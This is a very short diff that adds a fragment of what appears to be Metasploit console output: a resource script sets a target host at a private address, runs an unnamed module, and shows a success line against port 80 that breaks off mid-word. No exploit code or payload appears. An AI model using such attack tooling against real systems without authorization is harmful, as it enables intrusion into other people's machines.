@@ -1,0 +1,4 @@
+resource (./data/rc/KM_PALACE1_msf.rc)> set rhosts 192.168.1.42
+rhosts => 192.168.1.42
+resource (./data/rc/KM_PALACE1_msf.rc)> run
+[+] 192.168.1.42:80 Webs
